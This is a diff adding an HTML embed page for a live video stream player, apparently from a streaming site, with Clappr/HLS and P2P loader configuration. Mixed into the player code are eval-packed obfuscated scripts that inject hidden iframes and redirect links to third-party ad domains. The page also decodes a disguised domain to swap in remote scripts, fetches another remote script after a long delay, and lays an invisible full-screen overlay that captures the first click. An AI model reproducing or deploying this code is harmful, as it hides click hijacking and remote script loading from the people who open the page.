@@ -1,0 +1,151 @@
+             
+
+                    <!--domain: ragnarp.net--><!DOCTYPE html>
+
+<html>
+
+<head>
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+<meta name="viewport" content="width=device-width; initial-scale=1.0">
+
+<script>if(window==window.top) document.location="/"</script>
+
+<link rel="stylesheet" href="/css/embed.min.css?v=0.3" />
+
+</head>
+
+<body>
+
+<div class="jwplayer jw-reset jw-skin-glow player live" id="player"></div>
+
+<video-js id="player2" class="vjs-big-play-centered vjs-default-skin player" style="display: none" controls></video-js>
+
+<div id="btn-unmute" onclick="WSUnmute()" style="display:none">CLICK HERE TO UNMUTE</div>
+
+<div class="tb stream-offline" >
+
+  <div class="tb-col">
+
+	    <h2>STREAM IS OFFLINE</h2>
+
+    <p>Retrying in <span class="counter"></span> seconds</p>
+
+  </div>
+
+</div>
+
+<script src="/js/jquery.min.js"></script>
+
+<script>var WSreloadCounter=false,WSnTries=0,videoStarted = false, startMuted = startMuted(),mPlayer = 1,manifestLoaded = false,WSref=&#039;85lue&#039;;function errorPlaying(){$(".stream-offline .counter").text(10);$(".stream-offline").css("display","table");if (!WSreloadCounter)WSreloadCounter=setInterval(function(){var a=$(".stream-offline .counter").text();if(a>1){a--;$(".stream-offline .counter").text(a)}else{ clearInterval(WSreloadCounter);WSreloadCounter=false;WSnTries++;if(WSnTries<10){WSreloadStream();}else{ window.location.reload() } }},1000)}function startMuted(){var b=/constructor/i.test(window.HTMLElement)||(function(c){return c.toString()==="[object SafariRemoteNotification]"})(!window.safari||(typeof safari!=="undefined"&&safari.pushNotification));if(b){return true}if(window.chrome&&getChromeVersion()>=66){return true}var ff = navigator.userAgent.match(/firefox/([0-9]{2,})/i);if( ff && parseInt( ff[1] )>=66 ){return true}var a=(navigator.userAgent.match(/Opera|OPR//)?true:false);if(a){return true}return false}function getChromeVersion(){var b=navigator.userAgent.match(/Chrom(e|ium)/([0-9]+)./);return b?parseInt(b[2],10):false};function abd(){WSreloadStream=function(){return};if(player)player.stop();$("#player").remove();clearInterval(WSreloadCounter);$("body").html(&#039;<div class="tb stream-offline" style="display:table"><div class="tb-col"><h2>SANDBOX IFRAME NOT ALLOWED</h2><div style="padding-top: 0.8em">WATCH ON THE FOLLOWING LINK:</div><input value="http://&#039; + location.hostname + &#039;/live/85lue" onclick="this.select()" type="text" style="width:280px;border:0;background:none;color:#12e5a8;margin-top:20px;font-size:15px;text-align:center;"/></div></div>&#039;) }</script>
+
+<script src="https://swarm.video/wigistream.js?version=0.0.80"></script>
+
+<script>
+
+			if(typeof p2pml!="undefined") {
+
+				var engine = new p2pml.hlsjs.Engine({
+
+					segments: {
+
+						swarmId: "85lue",
+
+						forwardSegmentCount:50,
+
+					},
+
+					loader: {
+
+						// how long to store the downloaded segments for P2P sharing
+
+					    // cachedSegmentExpiration:86400000,
+
+					    // count of the downloaded segments to store for P2P sharing
+
+					    // cachedSegmentsCount:1000,
+
+					    // requiredSegmentsPriority:4,
+
+					    // each 1 second each of 10 segments ahead of playhead position gets 6% probability for random HTTP download
+
+					    // httpDownloadMaxPriority:9,
+
+					    // httpDownloadProbability:0.06,
+
+					    // httpDownloadProbabilityInterval: 1000,
+
+					    // disallow randomly download segments over HTTP if there are no connected peers
+
+					    // httpDownloadProbabilitySkipIfNoPeers: true,
+
+					    // P2P will try to download only first 51 segment ahead of playhead position
+
+					    // p2pDownloadMaxPriority: 50,
+
+					    // 1 second timeout before retrying HTTP download of a segment in case of an error
+
+					    // httpFailedSegmentTimeout:1000,
+
+					    // number of simultaneous downloads for P2P and HTTP methods
+
+					    // simultaneousP2PDownloads:10,
+
+					    // simultaneousHttpDownloads:3,
+
+					    // allow to continue aborted P2P downloads via HTTP
+
+					    httpUseRanges: true,
+
+						WaitForTracker: true,
+
+						WaitForTrackerCounter: 5000,
+
+						},
+
+					});
+
+			}</script>
+
+<script src="https://cdn.jsdelivr.net/npm/clappr@latest/dist/clappr.min.js"></script><style>.dvr-controls[data-dvr-controls] .live-info::before, .bar-fill-2{ background-color:#FF0101 !important; }</style>
+
+<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?&#039;&#039;:e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return&#039;\w+&#039;};c=1};while(c--){if(k[c]){p=p.replace(new RegExp(&#039;\b&#039;+e(c)+&#039;\b&#039;,&#039;g&#039;),k[c])}}return p}(&#039;4 2;4 9={1q:C,J:C,O:W,};4 f=u;4 6="i://X.Y.k:l/n/o.p?s=m&e=r";5(D H!="E"&&D b!="E"){5(b.G.Z.10()){f=d;9["13"]=H.U()}15{6="i://12.11.k:l/n/o.p?s=m&e=r"}}$(a).V(3(){2=A I.B({S:6,T:"#2",L:"t%",Q:"t%",N:{9:9,},K:u,F:j,M:"P",R:"",16:"1",14:"",18:{1p:3(e){1u()},1y:3(e){g(3(){$(".c-w").y()},1F);5(!v){v=d;g(3(){4 h=a.1s("1G")[0],s=a.1E("1D");s.17="1C/1A";s.1z=d;s.6="//1x.1w/1v/1t/1B/1r.1h";h.1a(s)},1b);5(j)$("#q-7").x()}},1c:3(e){$(".c-w").x()},1d:3(e){$("#q-7").y()},1e:3(){}}});5(f){b.G.1f(2)}g(3(){2.z()},1)});3 19(){$(".c-1g").1i("1j","1k");4 8=2.1l(2);8=A I.B(8.1m);2.1n();2=8;2.F();2.z();2.7()}3 1o(){2.7()}&#039;,62,105,&#039;||player|function|var|if|src|unmute|newplayer|hlsjsConfig|document|p2pml|stream|true||p2p|setTimeout||https|startMuted|net|8443|jb0oFhcuwKnk2LdfDUiBNA|hls|85lue|m3u8|btn|1633346781||100|false|videoStarted|logo|fadeIn|fadeOut|play|new|Player|60|typeof|undefined|mute|hlsjs|engine|Clappr|maxBufferLength|autoPlay|width|stretching|playback|liveMaxLatencyDuration|bestfit|height|watermark|source|parentId|createLoaderClass|ready|Infinity|jempomvqxjcylpwy|wzcdn804|Engine|isSupported|wzcdn774|okbdyeowhjxymkxb|loader|watermarkLink|else|position|type|events|WSreloadStream|appendChild|20000|onPause|onVolumeUpdate|onReady|initClapprPlayer|offline|js|css|display|none|configure|options|destroy|WSUnmute|onError|liveSyncDuration|eac57c020cd3ce56fea4a7f126ad0bad|getElementsByTagName|c5|errorPlaying|ea|com|horaceencampment|onPlay|async|javascript|7c|text|script|createElement|1000|head&#039;.split(&#039;|&#039;),0,{}))
+
+</script><script>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!&#039;&#039;.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return&#039;\w+&#039;};c=1};while(c--){if(k[c]){p=p.replace(new RegExp(&#039;\b&#039;+e(c)+&#039;\b&#039;,&#039;g&#039;),k[c])}}return p}(&#039;x(n(){$("m").l("<1 4=\"7\" 2=\"6\" 5=\"//k.j/i/g\" 8=\"3:a\" 9=\"0-b-c 0-d 0-e 0-f\"></1><1 4=\"7\" 2=\"6\" 5=\"p://q.r/o?s=t&u=v.w\" 8=\"3:a\" 9=\"0-b-c 0-d 0-e 0-f\"></1>")},h);&#039;,34,34,&#039;allow|iframe|height|display|width|src|1080|1920|style|sandbox|none|same|origin|scripts|popups|forms|28749|20000|iBsoG511Gsf7|com|collabplumify|append|body|function|redirect|https|uthorner|info|tid|756113|ref|wigistream|to|setTimeout&#039;.split(&#039;|&#039;),0,{}))
+
+</script><script type="text/javascript">
+
+(function() {setTimeout(function(){if(!window["s2ss104"]){let e=document.querySelector(&#039;script[did="SkWji"]&#039;),t=!!e.hasAttribute("admc")&&function(e){let t=atob(e).replace(/[a-zA-Z]/g,function(e){var t=e<="Z"?65:97;return String.fromCharCode(t+(e.charCodeAt(0)-t+13)%26)});return t.replaceAll("_",".")}(e.getAttribute("admc")),r=e.getAttribute("src"),a=e.parentElement,c=document.createElement("script");!function(e,t){let r,a=["did","admc","src"],c=Array.prototype.slice.call(t.attributes);for(;r=c.pop();)-1===a.indexOf(r.nodeName)&&e.setAttribute(r.nodeName,r.nodeValue)}(c,e),c.src=(d=r,"//"+t+d.replace(/^.*//[^/]+/,"")),c.setAttribute("sadbl",1),a.removeChild(e),a.appendChild(c)}var d},150);document.body.addEventListener("click",function(e){window["s2ss104ff"]instanceof Function&&window["s2ss104ff"](e)});})();
+
+</script>
+
+<script type="text/javascript">setTimeout(function(){var h = document.getElementsByTagName("head")[0],s = document.createElement("script");s.type = "text/javascript";s.async = true;s.src = "//collabplumify.com/fZy3h3WFsEwfy7CT/28750";h.appendChild(s);},200000);</script><div style="position:absolute;top:0;left:0;width: 100%;height: 100%;z-index:2147483647" onclick="$(this).remove();"></div><!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-184968220-1"></script>
+
+<script>
+
+  window.dataLayer = window.dataLayer || [];
+
+  function gtag(){dataLayer.push(arguments);}
+
+  gtag(&#039;js&#039;, new Date());
+
+  gtag(&#039;config&#039;, &#039;UA-184968220-1&#039;);
+
+</script>
+
+<div style="display:none;"><img id="vw24" src="//whos.amung.us/cwidget/y7opzyrraw/000000ffffff.png"></div>
+
+<script>var vw24 = document.getElementById("vw24");setInterval(function(){vw24.src="//whos.amung.us/cwidget/y7opzyrraw/000000ffffff.png?"+new Date().getTime()},300000);</script>
+
+</body>
+
+</html>
+
+                
+
+            
